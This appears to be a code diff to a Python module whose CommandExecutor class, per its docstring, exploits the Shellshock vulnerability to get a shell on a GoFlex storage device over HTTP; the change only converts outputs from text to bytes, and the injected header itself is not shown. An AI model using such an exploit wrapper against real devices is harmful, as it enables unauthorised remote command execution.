@@ -2,13 +2,13 @@ import re
 
 import requests
 
-OUTPUT_PREFIX = re.compile(r'Your assigned port is \d+\s*([\s\S]*)')
+OUTPUT_PREFIX = re.compile(rb'Your assigned port is \d+\s*([\s\S]*)')
 
 
 class CommandExecutor:
 
     @classmethod
-    def execute(cls, ip: str, command: str) -> str:
+    def execute(cls, ip: str, command: str) -> bytes:
         """
         Executes a shell command and returns the output.
         """
@@ -21,7 +21,7 @@ class CommandExecutor:
         return OUTPUT_PREFIX.match(output).group(1)
 
     @staticmethod
-    def _unsafe_execute(ip: str, command: str) -> str:
+    def _unsafe_execute(ip: str, command: str) -> bytes:
         """
         Exploit shellshock vulnerability to get a shell on the GoFlex device.
         """
@@ -32,4 +32,4 @@ class CommandExecutor:
             }
         )
 
-        return response.text.strip()
+        return response.content.strip()
